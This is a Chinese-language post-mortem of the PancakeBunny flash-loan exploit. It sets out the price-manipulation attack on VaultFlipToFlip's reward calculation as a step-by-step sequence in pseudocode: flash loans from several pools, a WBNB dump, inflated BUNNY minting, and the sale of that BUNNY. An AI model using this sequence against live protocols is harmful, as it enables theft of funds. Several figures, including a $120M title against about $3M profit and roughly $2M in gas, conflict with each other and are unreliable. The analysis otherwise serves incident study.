# PancakeBunny $120M — 代码级分析

## 漏洞合约: `VaultFlipToFlip.sol`

### 攻击核心: `getReward()` 价格计算

```solidity
function earned(address account) public view returns (uint256) {
    // ⚠️ 从LP pair瞬时价格计算BUNNY价值
    uint256 totalValue = zapAssetsToBunnyBNB(...);
    // 攻击者可以通过操纵WBNB-USDT池来扭曲totalValue
    // ...
}
```

### 攻击执行

**Step 1: 准备 (Tx 1)**
```solidity
zap.zapInToken(WBNB, 1e18, address(WBNBUSDTv2));
flip.deposit(lpamount); 
// 存入最小LP取得reward资格
```

**Step 2: keeper调用harvest()** — 确认earned() > 0

**Step 3: 价格操纵 (Tx 2的核心)**

```solidity
// 从7个PCS池中闪贷WBNB
for each pair in [CAKE,BUSD,ETH,BTC,SAFEMOON,BELT,DOT]:
    pair.swap(0, reserve1-1, address(this), data);
    // → 递归触发pancakeCall再借更多
    
// Fortube Bank USDT闪贷 → ~3M USDT
FortubeBank.flashloan(address(this), USDT, 2_961_750e18, "");

// ⚠️ 关键操纵:
zap.zapInToken(WBNB, 15_000e18, WBNBUSDTv2);
// 然后:
// Dump all WBNB for USDT → WBNB-USDT价格暴跌
```

**Step 4: 获取膨胀reward**
```solidity
flip.getReward(); // BUNNY增发基于操纵后的价格 — 获得超量BUNNY
```

**Step 5: 倾销BUNNY**
```solidity
WBNBBUNNY.swap(amountOut, 0, address(this), "");
// 卖空所有BUNNY换WBNB → BUNNY归零
```

## 根本原因

`VaultFlipToFlip.getReward()`使用瞬时Uniswap价格计算BUNNY铸造量:
- 正常情况: 1 BUNNY ≈ $100
- 操纵后: 1 BUNNY ≈ $0.01 (因为WBNB被大量卖入)
- 铸造公式: reward = poolSize / BUNNY_price
- 价格暴跌 → reward数量暴增 → 铸造天量BUNNY

**模式**: #1 (闪贷+价格操纵) — 和bZx同类型, 但尺度更大
**总成本**: ~$2M gas + 闪贷利息
**攻击者利润**: ~$3M (直接利润) + BUNNY归零 (市场影响)
